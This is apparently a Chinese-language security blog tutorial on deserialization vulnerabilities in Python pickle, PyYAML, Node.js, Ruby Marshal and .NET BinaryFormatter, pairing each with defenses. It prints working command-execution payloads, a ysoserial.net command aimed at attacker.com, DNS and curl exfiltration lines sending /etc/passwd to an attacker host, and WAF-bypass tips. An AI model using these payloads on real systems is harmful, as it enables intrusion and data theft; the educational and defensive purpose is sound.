---
title: Python与Node.js反序列化漏洞
date: 2026-06-15 08:00:00
tags:
  - Web安全
  - 反序列化
  - 渗透测试
categories: 渗透测试
---

## 前言

反序列化漏洞是渗透测试中极具杀伤力的一类安全问题。攻击者通过构造恶意的序列化数据，在目标应用进行反序列化时触发任意代码执行、权限提升或敏感信息泄露。本文聚焦Python与Node.js两大生态中的常见反序列化攻击面，兼顾Ruby Marshal与.NET BinaryFormatter，系统梳理其原理、利用链与实战技巧。

## 一、反序列化漏洞的本质

序列化的本质是将运行时的对象状态转换为可存储或可传输的字节流；反序列化则是其逆过程，将字节流还原为内存中的对象。问题出在"还原"这一步——如果反序列化过程不限制可实例化的类型，攻击者就能注入精心构造的对象，在对象重建阶段触发危险操作。

大部分面向对象语言都提供了一种"魔法方法"机制——对象在反序列化重建时自动调用的回调函数。攻击者的核心思路就是控制这些回调的输入，使其执行系统命令、读写文件或发起网络连接。

## 二、Python Pickle 反序列化

### 2.1 Pickle 协议概述

`pickle` 是Python标准库中的序列化模块，支持几乎所有Python对象的序列化与反序列化。它采用一套基于栈的虚拟机指令集（opcode），序列化的过程就是生成这些opcode的过程，反序列化则是逐条执行opcode。

Pickle协议共有6个版本（0-5），高版本在效率和功能上有所增强，但核心机制不变。

### 2.2 __reduce__ 方法利用

`pickle` 在反序列化对象时会查找类的 `__reduce__` 方法。该方法返回一个元组 `(callable, args)`，pickle引擎会执行 `callable(*args)` 来重建对象。攻击者可以构造一个类，使其 `__reduce__` 方法返回 `(os.system, ('whoami',))`，从而实现命令执行。

```python
import pickle
import os
import base64

class Exploit(object):
    def __reduce__(self):
        # 返回 (callable, args)
        return (os.system, ('whoami',))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())
```

实际利用中更常用 `__reduce_ex__`，它比 `__reduce__` 优先级更高。许多第三方库会在反序列化过程中调用被还原对象上的方法，这为构造更复杂的利用链（gadget chain）提供了可能。

### 2.3 手工构造Pickle Opcode

除了利用 `__reduce__`，攻击者还可以直接编写pickle opcode。以下opcode序列等价于执行 `os.system('whoami')`：

```python
import pickle
import os

opcode = b"""cos
system
(S'whoami'
tR."""
pickle.loads(opcode)
```

各指令含义：
- `c`：导入模块和函数（`os.system`）
- `(`：将字符串压入栈
- `t`：从栈中弹出元组元素构建元组
- `R`：调用栈顶的可调用对象，传入次栈顶的元组作为参数
- `.`：结束

### 2.4 实战注意事项

- **协议版本**：`pickle.dumps` 默认使用协议3（Python 3），需注意目标Python版本
- **Windows vs Linux**：命令执行payload需根据目标操作系统调整
- **回显问题**：无回显时可使用 `curl`、`wget`、DNS外带等方式获取命令输出
- **沙箱环境**：部分环境限制 `os.system`，可尝试 `subprocess`、`pty.spawn` 等替代

### 2.5 防护措施

- **绝对不要对不可信数据调用 `pickle.loads`**——这是唯一的根本解决方案
- 如果必须使用，考虑使用 `pickle.Unpickler.find_class` 进行白名单校验
- 使用安全的序列化格式替代，如 JSON（仅支持基本类型）
- 在沙箱或隔离环境中执行反序列化操作

## 三、PyYAML 不安全加载

### 3.1 YAML 与 PyYAML

YAML是常用的配置文件格式，PyYAML是Python生态中最流行的YAML解析库。`yaml.load()` 函数默认支持解析并实例化任意Python对象——这个"特性"使其成为反序列化攻击的重要入口。

### 3.2 利用原理

YAML规范允许通过标签 `!!python/object` 指定要实例化的Python类。PyYAML在 `yaml.load()`（注意，不是 `safe_load`）中会解析这些标签并执行对象构造：

```yaml
!!python/object/apply:os.system ["whoami"]
```

或者更复杂的写法：

```yaml
!!python/object/apply:subprocess.check_output [["whoami"]]
```

### 3.3 利用代码

```python
import yaml

payload = """
!!python/object/apply:os.system ["whoami"]
"""
# 危险：会执行系统命令
yaml.load(payload, Loader=yaml.Loader)
```

Python 3.6之后 `yaml.load()` 默认使用 `SafeLoader`，需要显式传入 `Loader=yaml.Loader` 才能触发。但在许多遗留代码和教程中，开发者仍在传递不安全的Loader参数。

### 3.4 PyYAML CVE 经典案例

- **CVE-2017-18342**：`yaml.load()` 在未指定Loader时可触发任意代码执行
- **CVE-2020-1747**：PyYAML `FullLoader` 同样可被利用

### 3.5 防护措施

- 强制使用 `yaml.safe_load()` 或 `yaml.load(..., Loader=yaml.SafeLoader)`
- 在CI/CD中加入安全Lint规则（如bandit）检测 `yaml.load` 调用
- 评估是否可以用 `json`、`toml` 等更安全的格式替代YAML

## 四、Node.js 反序列化

### 4.1 node-serialize 与 IIFE

`node-serialize` 是一个npm包，提供类似PHP `serialize` 的序列化功能。其 `unserialize()` 方法会将序列化字符串中的函数体直接通过 `eval` 执行。

默认情况下 `eval` 不能直接执行函数声明，因此攻击载荷通常包装在**立即执行函数表达式（IIFE）**中：

```javascript
// 攻击载荷结构
(function(){
    require('child_process').exec('whoami', function(error, stdout, stderr) {
        console.log(stdout);
    });
})();
```

完整序列化后的payload示例：

```javascript
var serialize = require('node-serialize');

var payload = {
    rce: function(){
        require('child_process').exec('whoami', function(error, stdout, stderr) {
            console.log(stdout);
        });
    }
};

var serialized = serialize.serialize(payload);
console.log(serialized);
// 输出类似：{"rce":"_$$ND_FUNC$$_function(){ ... }"}
```

在实际利用中，攻击者通常需要在payload末尾添加 `()` 使其成为IIFE，或者在序列化字符串中直接拼接自执行语法。

### 4.2 更危险的反序列化库

除 `node-serialize` 外，以下npm包也曾存在反序列化RCE问题：

| 包名 | 危险方法 | 说明 |
|------|---------|------|
| `node-serialize` | `unserialize()` | 使用 `eval` 执行函数体 |
| `serialize-to-js` | `deserialize()` | 旧版本使用 `eval` |
| `funcster` | `unserialize()` | 同 `node-serialize` 原理 |
| `js-serialize` | `deserialize()` | 存在命令注入 |
| `serialize-javascript` | `deserialize()` | 配置不当可RCE |

### 4.3 js-yaml 反序列化RCE

与PyYAML类似，Node.js的 `js-yaml` 库也支持自定义类型反序列化。当 `js-yaml` 配合自定义 schema 中的 `!!js/function` 类型时，会直接通过 `new Function()` 创建并执行函数：

```yaml
!!js/function >
  (function() {
    require('child_process').exec('whoami');
  })()
```

```javascript
const yaml = require('js-yaml');
const fs = require('fs');

// 危险：使用UNSAFE_SCHEMA
const unsafeYaml = yaml.load(
    fs.readFileSync('payload.yaml', 'utf8'),
    { schema: yaml.DEFAULT_SCHEMA } // 注意：DEFAULT_SCHEMA不支持!!js/function
);
```

实际利用中，攻击者需要目标使用包含 `!!js/function` 的 schema（如某些自定义配置），或者在应用允许用户上传并加载YAML配置文件时实施攻击。

### 4.4 Node.js 防护措施

- 禁止使用 `eval` / `new Function` 处理用户输入
- 反序列化操作使用 `JSON.parse` 替代，JSON不支持函数
- 若必须使用YAML，调用 `yaml.safeLoad()` 或 `yaml.load()` 配合 `schema: yaml.SAFE_SCHEMA`
- 在 `package.json` 中锁定依赖版本，定期审计 `npm audit`

## 五、Ruby Marshal.load 反序列化

### 5.1 Marshal 简介

Ruby的 `Marshal` 模块提供对象的二进制序列化。`Marshal.load` 将字节流还原为Ruby对象。与Python的pickle类似，Marshal在反序列化过程中也会调用一些特殊的钩子方法。

### 5.2 利用链

Ruby反序列化的关键切入点是 `Gem::Specification`、`Gem::Requirement` 等标准库类。这些类在反序列化过程中会调用某些能触发代码执行的方法。配合恶意构造的序列化数据，可形成稳定的利用链（universal gadget chain）。

主要涉及的魔法方法：
- `marshal_load`：Marshal反序列化后调用
- `_load`：自定义反序列化入口
- `initialize_copy` / `init_with`：对象重建过程中调用

```ruby
# 经典利用payload结构（概念性示例）
require 'base64'

# 使用 marshal_dump 方法来控制序列化数据
class Malicious
  def marshal_load(obj)
    system('whoami')
  end
end

# 实际利用中，攻击者会利用标准库中已有的类来构造利用链
# 而非自定义类（因为目标服务器上没有加载自定义类）
```

### 5.3 经典 Gadget Chain

Ruby on Rails应用中较为知名的gadget chain利用链：

```
Marshal.load → Gem::Requirement → Gem::Dependency → ...
→ ERB.new → ERB#result → system command
```

在实际渗透中，成熟的Ruby Marshal利用工具（如 `ysomap`、`marshalsec`）能自动生成针对不同Ruby/Rails版本的payload。

### 5.4 防护措施

- 使用 `JSON.parse` 或 `YAML.safe_load` 替代 `Marshal.load`
- 若必须使用Marshal，仅反序列化来自可信源的数据
- 升级Ruby和Rails版本，修复已知利用链

## 六、.NET BinaryFormatter 反序列化

### 6.1 机制概述

`BinaryFormatter` 是.NET Framework中最常用的二进制序列化器。它在反序列化时通过读取类型信息并使用反射来重建对象图。这个"类型解析"过程给了攻击者可乘之机：

- 攻击者可以在序列化数据中嵌入任意类型信息
- 当CLR尝试实例化这些类型时，会触发对象的构造函数和相关回调
- 配合特定类（gadget）的方法调用链，形成RCE

### 6.2 常见Gadget类型

| Gadget类型 | 命名空间 | 说明 |
|-----------|---------|------|
| `TextFormattingRunProperties` | `Microsoft.VisualStudio.Text.Formatting` | VS文本格式属性，可用于任意文件读取 |
| `ObjectDataProvider` | `System.Windows.Data` | 可调用静态方法（Process.Start） |
| `ActivitySurrogateSelector` | `System.Workflow.ComponentModel` | WF工作流组件，可触发任意代码 |
| `DataSet` / `DataTable` | `System.Data` | 数据库反序列化gadget |
| `TypeConfuseDelegate` | — | 委托混淆gadget，通用型利用 |

### 6.3 利用示例（ysoserial.net）

```bash
# 使用 ysoserial.net 生成BinaryFormatter payload
ysoserial.exe -g ObjectDataProvider -f BinaryFormatter \
  -c "ping attacker.com" -o base64
```

`ysoserial.net` 是一个专门针对.NET反序列化的payload生成工具，内置数十种gadget利用链，覆盖从Exchange到SharePoint到ViewState的多种攻击场景。

### 6.4 防护措施

- **.NET 5+**：`BinaryFormatter` 已被标记为 `[Obsolete]` 并计划移除。迁移到 `System.Text.Json`
- 使用 `SerializationBinder` 实现类型白名单
- 切勿反序列化不可信来源的二进制数据
- 启用 `AppDomain.AssemblyResolve` 事件的监控

## 七、多语言反序列化对比

| 特性 | Python pickle | PyYAML | Node.js node-serialize | Ruby Marshal | .NET BinaryFormatter |
|------|-------------|--------|------------------------|--------------|---------------------|
| **序列化格式** | 二进制(opcode) | 文本(YAML) | 文本(JSON-like) | 二进制 | 二进制 |
| **触发方法** | `__reduce__` / `__reduce_ex__` | `!!python/object` 标签 | `eval` 执行函数体 | `marshal_load` 回调 | 类型解析+反射 |
| **利用复杂度** | 低 | 低 | 低 | 中 | 中-高 |
| **Gadget需求** | 无需（直接构造） | 无需（直接构造） | 无需（直接构造） | 需利用标准库链 | 需特定gadget类 |
| **影响范围** | 任何使用pickle的应用 | 使用yaml.load的应用 | 使用node-serialize的应用 | Ruby/Rails应用 | .NET Framework应用 |
| **Payload工具** | 手工/Python脚本 | 手工/YAML | Burp Suite/手工 | ysomap/marshalsec | ysoserial.net |
| **默认安全性** | 不安全 | 3.6+默认安全 | 不安全 | 不安全 | 不安全 |
| **推荐替代** | JSON | safe_load / JSON | JSON.parse | JSON.parse | System.Text.Json |

## 八、实战利用思路

### 8.1 常见攻击入口

- **Cookie反序列化**：某些Web框架会将会话对象序列化后存入Cookie，修改Cookie可实现RCE
- **API参数**：接受序列化数据的API端点（如`/api/import`），直接传入payload
- **文件上传**：上传包含恶意序列化数据的文件，等待应用解析
- **数据库存储**：当应用从数据库中读取并反序列化字段时，先行注入恶意数据
- **消息队列**：向目标队列投递恶意的序列化消息

### 8.2 无回显利用技巧

当目标执行命令但无回显时：
- **DNS外带**：使用 `nslookup $(whoami).attacker.com` 将结果编码到DNS查询中
- **HTTP外带**：`curl http://attacker.com/$(base64 /etc/passwd)`
- **时间盲注**：根据命令执行时长判断结果（如 `sleep 5`）
- **文件写入**：将结果写入Web目录下的静态文件，再通过HTTP访问

### 8.3 防御绕过

- **WAF绕过**：对payload进行编码、加密、压缩
- **类型白名单绕过**：寻找白名单内的可用gadget类
- **版本适配**：不同库版本支持的利用链不同，需提前侦察

## 九、渗透测试清单

在对目标应用进行反序列化漏洞测试时，建议按以下清单逐项排查：

1. 识别应用中接受序列化数据的入口点（Cookie、请求体、文件上传、WebSocket等）
2. 确认使用的序列化库及版本
3. 测试序列化数据的格式特征（如pickle以 `\x80` 开头，Marshal以 `\x04\x08` 开头）
4. 尝试使用已知payload进行盲打
5. 在有回显的测试环境中先验证payload有效性
6. 结合DNS/HTTP外带确认命令执行
7. 利用成功后评估权限并尝试提权

## 免责声明

**本文仅供安全研究与教学目的使用。** 文章中所描述的技术和方法仅应用于授权的渗透测试和安全评估活动中。任何人不得利用文中技术对未经授权的系统进行攻击。因不当使用本文信息而导致的任何直接或间接后果，作者不承担任何法律责任。

在从事安全测试和学习之前，请确保：
- 您获得了被测系统所有者的书面授权
- 您在隔离的、自己搭建的实验环境中进行练习
- 您遵守所在地区的法律法规
- 您遵循负责任的漏洞披露原则

## 参考资料

- [Python pickle 官方文档](https://docs.python.org/3/library/pickle.html)
- [PyYAML 安全警告](https://pyyaml.org/wiki/PyYAMLDocumentation)
- [Node.js node-serialize RCE](https://snyk.io/blog/general/node-serialize-code-execution/)
- [ysoserial.net GitHub](https://github.com/pwntester/ysoserial.net)
- [Ruby Marshal Security](https://ruby-doc.org/core-3.0.0/Marshal.html)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
